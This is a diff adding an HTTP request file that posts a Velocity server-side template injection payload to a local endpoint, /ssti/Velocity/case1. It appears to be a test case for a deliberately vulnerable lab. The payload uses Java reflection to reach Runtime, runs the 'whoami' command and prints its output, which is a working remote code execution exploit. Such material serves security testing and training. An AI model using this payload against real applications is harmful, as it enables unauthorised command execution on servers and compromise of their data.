@@ -1,0 +1,7 @@
+###
+POST /ssti/Velocity/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+w#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('whoami')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
